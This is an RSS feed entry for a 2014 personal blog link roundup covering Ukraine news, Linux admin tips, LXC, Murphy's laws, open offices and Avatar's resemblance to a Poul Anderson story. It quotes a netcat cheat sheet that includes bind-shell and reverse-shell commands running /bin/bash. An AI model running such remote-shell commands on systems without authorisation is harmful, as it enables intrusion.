@@ -1,0 +1,110 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>open space &#8211; Ivan Pesin</title>
+	<atom:link href="/blog/tag/open-space/feed/" rel="self" type="application/rss+xml" />
+	<link>https://pesin.space/blog</link>
+	<description>Articles &#38; Translations</description>
+	<lastBuildDate>
+	Wed, 19 Oct 2016 02:08:18 +0000	</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.1.1</generator>
+	<item>
+		<title>Links: Jan 19th</title>
+		<link>/blog/2014/01/links-jan-19th/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-jan-19th</link>
+				<pubDate>Sat, 18 Jan 2014 22:15:50 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[301]]></category>
+		<category><![CDATA[algorithms]]></category>
+		<category><![CDATA[auditd]]></category>
+		<category><![CDATA[Avatar]]></category>
+		<category><![CDATA[AWS]]></category>
+		<category><![CDATA[bootstrap]]></category>
+		<category><![CDATA[centos]]></category>
+		<category><![CDATA[data structures]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[LXC]]></category>
+		<category><![CDATA[Murphy]]></category>
+		<category><![CDATA[nc]]></category>
+		<category><![CDATA[netcat]]></category>
+		<category><![CDATA[open space]]></category>
+		<category><![CDATA[redirect]]></category>
+		<category><![CDATA[Ukraine]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2014/01/links-jan-19th/</guid>
+				<description><![CDATA[&#160; Okay, you&#8217;d think Murphy laws were jokes. But as situation in Ukraine shows most of them are true, aren&#8217;t they? If something can go wrong, it will. Left to themselves, things tend to go from bad to worse. When things just can&#8217;t get any worse, they will. All of this really saddens me and [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />&nbsp;</p>
+<p>Okay, you&#8217;d think Murphy laws were jokes. But as situation in Ukraine shows most of them are true, aren&#8217;t they?</p>
+<ul>
+<li><a href="http://www.economist.com/news/leaders/21591589-viktor-yanukovych-has-made-his-choice-his-country-has-chosen-otherwise-goodbye-putin?zid=307&amp;ah=5e80419d1bc9821ebe173f4f0f060a07">If something can go wrong, it will.</a></li>
+<li><a href="http://www.economist.com/blogs/easternapproaches/2014/01/ukraine?zid=307&amp;ah=5e80419d1bc9821ebe173f4f0f060a07">Left to themselves, things tend to go from bad to worse</a>.</li>
+<li><a href="http://www.economist.com/news/europe/21594340-viktor-yanukovychs-government-still-faces-proteststhough-smaller-ones-still-out-there">When things just can&#8217;t get any worse, they will</a>.</li>
+</ul>
+<p>All of this really saddens me and spoils good faith in further; but it does demonstrate the essence of real world and people&#8217;s desires. Turning though from harsh reality to wonders of virtual world, let&#8217;s start with few reminder links:</p>
+<ul>
+<li>How to see <a href="http://www.cyberciti.biz/tips/linux-audit-files-to-see-who-made-changes-to-a-file.html">what made changes</a> to a file using <b>auditd:</b></li>
+</ul>
+<blockquote><p>
+</p><pre class="crayon-plain-tag"># auditctl -w /etc/passwd -p war -k password-file
+# ausearch -f /etc/passwd</pre><p>
+</p></blockquote>
+<ul>
+<li>netcat <a href="http://injustfiveminutes.com/2013/11/19/netcat-cheat-sheet/">cheat sheet</a>:</li>
+</ul>
+<blockquote><p>Suppose you want to transfer a file &#8220;file.txt&#8221; from server A to client B.<br />
+<code>Server: $ nc -l 4444 &lt; file.txt<br />
+</code><code>Client: $ nc -n 192.168.1.100 4444 &gt; file.txt</code></p>
+<p>Suppose you want to transfer a file &#8220;file.txt&#8221; from client B to server A:<br />
+<code>Server: $ nc -l 4444 &gt; file.txt<br />
+Client: $ nc 192.168.1.100 4444 &lt; file.txt</code></p>
+<p>Remote shell:<br />
+<code>Server: $ nc -l 4444 -e /bin/bash -i<br />
+Client: $ nc 192.168.1.100 4444</code></p>
+<p>Reverse remote shell:<br />
+<code>Server: $ nc -l 4444<br />
+Client: $ nc 192.168.1.100 4444 -e /bin/bash</code></p></blockquote>
+<h3>Technology:</h3>
+<ul>
+<li>CentOS Project <a href="http://lists.centos.org/pipermail/centos-announce/2014-January/020100.html">joins forces</a> with Red Hat! Yay!</li>
+<li>I&#8217;m an SA. I hate 301 redirects. Here&#8217;s <a href="http://getluky.net/2010/12/14/301-redirects-cannot-be-undon/">why</a>. There&#8217;s also few ideas how to undo some of the harm.</li>
+<li>Basic <a href="http://cstheory.stackexchange.com/questions/19759/core-algorithms-deployed/19773?utm_content=bufferacb4a&amp;utm_source=buffer&amp;utm_medium=twitter&amp;utm_campaign=Buffer#19773">Data Structures and Algorithms</a> in the Linux kernel.</li>
+<li><a href="http://www.reddit.com/r/IAmA/comments/1e5o4p/iaman_exaws_engineer_ask_me_anything_about_the/">Ex-AWS engineer on AWS internals</a>, extremely interesting (thanks Serge!)</li>
+<li>Wonderful <a href="http://containerops.org/2013/11/19/lxc-networking/?utm_content=buffer9a57f&amp;utm_source=buffer&amp;utm_medium=twitter&amp;utm_campaign=Buffer">article on LXC</a> and the way its networking is organised.</li>
+<li>Very nice <a href="http://www.blacktie.co">free bootstrap themes</a>.</li>
+<li><a href="https://www.tbray.org/ongoing/When/201x/2014/01/01/Software-in-2014">Software in 2014</a> &#8212; <a href="https://www.tbray.org/ongoing/When/201x/2011/12/27/Type-Systems">Bánffy-Bray criteria</a> for selecting between static and dynamic type systems, everything over HTTP and concurrent, mobile and browser suck, and the client-side is a mess.</li>
+</ul>
+<h3>English:</h3>
+<ul>
+<li>For collection &#8212; <a href="https://www.maths.nottingham.ac.uk/personal/ibf/some.html">Murphy&#8217;s laws</a></li>
+<li><a href="http://www.economist.com/blogs/johnson/2010/09/word_inflation">Dead, or living too well</a>? Is linguistic inflation <a href="http://www.macmillandictionaryblog.com/is-linguistic-inflation-insanely-awesome">insanely awesome</a>?</li>
+<li><a href="http://www.macmillandictionaryblog.com/five-rules-of-thumb-for-polite-and-diplomatic-language">Five Rules of Thumb</a> for Polite and Diplomatic Language.</li>
+</ul>
+<h3>Other:</h3>
+<ul>
+<li>Physicist Lawrence Krauss gives a talk on our current picture of the universe, how it will end, and how it could have come from nothing. Very thrilling talk on cosmology:</li>
+</ul>
+<blockquote><p><center><br />
+<iframe width="625" height="352" src="https://www.youtube.com/embed/EjaGktVQdNg?feature=oembed" frameborder="0" allowfullscreen></iframe><br />
+</center></p></blockquote>
+<ul>
+<li>Open offices are an unfortunate misunderstanding. <a href="http://www.newyorker.com/online/blogs/currency/2014/01/the-open-office-trap.html">New Yorker</a>:</li>
+</ul>
+<blockquote><p>The open office was <a href="http://dwp.bigplanet.com/pdkconsulting/nss-folder/pdfdownloads1/New_DuffyTanis1993.pdf" target="_blank">originally conceived</a> by a team from Hamburg, Germany, in the nineteen-fifties, to facilitate communication and idea flow. But a growing body of evidence suggests that the open office undermines the very things that it was designed to achieve. In <a href="http://eab.sagepub.com/content/34/3/279" target="_blank">June, 1997,</a> a large oil and gas company in western Canada asked a group of psychologists at the University of Calgary to monitor workers as they transitioned from a traditional office arrangement to an open one. The psychologists assessed the employees’ satisfaction with their surroundings, as well as their stress level, job performance, and interpersonal relationships before the transition, four weeks after the transition, and, finally, six months afterward. The employees <strong>suffered according to every measure</strong>: the new space was disruptive, stressful, and cumbersome, and, instead of feeling closer, coworkers felt distant, dissatisfied, and resentful. Productivity fell.</p></blockquote>
+<p><span style="line-height: 1.5em;">When the Avatar was first released I was appalled by claims that it was touted as &#8216;totally original work from the mind of Cameron&#8217;. I was sure that many years ago I read strikingly similar story by some of well-known sci-fi writers, but was struggling to remember the name of either the novel or the author. There was the same paraplegic hero who telepathically connected with an artificially created life form in order to explore a harsh planet and get access to its resources. Doesn&#8217;t it sound similar to the Avatar&#8217;s plot?</span></p>
+<p>Recently I accidentally stumbled upon this novel &#8212; that was Poul Anderson&#8217;s <a href="http://en.wikipedia.org/wiki/Call_Me_Joe">Call Me Joe</a>, written in (!) 1957. This is a classic sci-fi masterpiece and I would recommend reading it any time.</p>
+]]></content:encoded>
+										</item>
+	</channel>
+</rss>
